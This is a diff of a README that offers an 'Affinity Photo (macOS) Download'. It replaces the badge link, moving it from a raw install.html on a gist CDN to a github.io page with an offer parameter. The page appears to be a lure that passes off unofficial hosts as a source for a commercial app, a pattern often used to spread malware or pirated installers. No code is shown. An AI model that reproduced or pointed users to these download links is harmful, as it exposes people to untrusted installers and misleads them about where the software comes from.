@@ -1,6 +1,6 @@
 # Affinity Photo (macOS) Download — Photo Editing Suite
 
-[![Get Affinity Photo GitHub](https://img.shields.io/badge/Get%20Affinity%20Photo%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/blackprince8-art/69c3ca5c083d7b6a5eda2dec42f382a4/raw/dca176115e00f6d73488e6c8f1ff9621c4b98a47/install.html)
+[![Get Affinity Photo GitHub](https://img.shields.io/badge/Get%20Affinity%20Photo%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-apps-deployer.github.io/.github/?offer=AffinityPhoto)
 
 ---
 
